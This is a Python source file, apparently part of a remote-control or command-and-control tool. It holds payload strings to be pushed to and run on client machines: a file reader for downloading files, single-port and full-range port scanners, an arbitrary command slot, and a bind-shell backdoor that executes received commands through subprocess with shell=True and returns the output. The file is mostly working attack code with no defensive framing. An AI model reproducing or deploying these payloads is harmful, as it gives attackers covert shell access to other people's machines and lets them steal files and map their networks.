


class command:
    def __init__(self, payload, type, args_to_ask):
        self.payload = bytes(str(payload), 'utf-8')
        self.type = type
        self.args_to_ask = args_to_ask

    def enter_args(self):
        args = []
        for arg_title in self.args_to_ask:
            arg = input( arg_title+"\n")
            args.append(arg)
        self.args = args
        
##################  PAYLOAD FILES ############################
d_payload = """import sys
import os

filepath = sys.argv[1]
f=open(filepath,"r") 
data=f.read()
f.close()
print(data)"""

p_payload = """import socket
import sys
ip, port = sys.argv[1], int(sys.argv[2])
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
result = s.connect_ex((ip, port))
if result == 0:
    print("PORT " +str(port) + " - OPEN")
else:
    print("PORT " +str(port) + " - CLOSED")"""

ce_payload =""""""

# took troj_payload from https://github.com/Metallicode/pythonCourse3.6.5
backdoor_payload = """
import socket
import subprocess
import os
import sys

with socket.socket() as soc:
      soc.bind((sys.argv[1], int(sys.argv[2]))) 
      soc.listen()
      client, address = soc.accept() 
      command = ""
      while command != "q":
            command = client.recv(256).decode() #get command from client 
            if command[:2]=="cd" and len(command)>2: #if command was 'cd xxxx' use os.chdir(path)
                  os.chdir(command[3:]) #change dir
                  client.send(os.getcwd().encode()) #return new dir path
                  continue # no sub process this time

            
            process = subprocess.run(command, shell=True ,stdout=subprocess.PIPE, stderr=subprocess.PIPE) #run command on shell
            client.send(process.stdout) #send stdout to server"""


all_ports_payload = """import sys
import socket
from datetime import datetime
import threading
  
if len(sys.argv) == 2:
    target_ip = socket.gethostbyname(sys.argv[1])
else:
    print("Invalid amount of Argument")
 

print("-" * 50)
print("Scanning Target: " + target_ip)
print("Scanning started at:" + str(datetime.now()))
print("-" * 50)
  

def check_open(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket.setdefaulttimeout(1)
        
    # returns an error indicator
    result = s.connect_ex((target_ip,port))
    if result ==0:
        print("Port {} is open".format(port))
    s.close()
         
try:
    # will scan ports between 1 to 65,535
    for port in range(1,65535):
        t  = threading.Thread(target=check_open, args=(port,))
        t.start()
         
except socket.gaierror:
        print("Hostname Could Not Be Resolved !!!!")
        sys.exit()
except socket.error:
        print("\ Server not responding !!!!")
        sys.exit()

"""

##############################################################



##########    PAYLOAD ARGS TO ENTER BY USER   #################
d_args      = ['enter filepath:', 'enter filename']
p_args      = ["check single port:"]
ce_args     = ["enter single exe command:"]
bs_args     = ["enter port to take control over client's shell:"]
###############################################################



download_file   = command(payload=d_payload, type='download_file', args_to_ask=d_args)
all_ports_scan  = command(payload=all_ports_payload, type='all_ports_scan', args_to_ask=[])
one_port_scan   = command(payload=p_payload, type='one_port_scan', args_to_ask=p_args)
cmd_exe         = command(payload=ce_payload, type='cmd_exe', args_to_ask=ce_args)
backdoor_shell  = command(payload=backdoor_payload, type='take_shell', args_to_ask=bs_args)

commands_list  = [download_file, all_ports_scan, one_port_scan, cmd_exe, backdoor_shell]



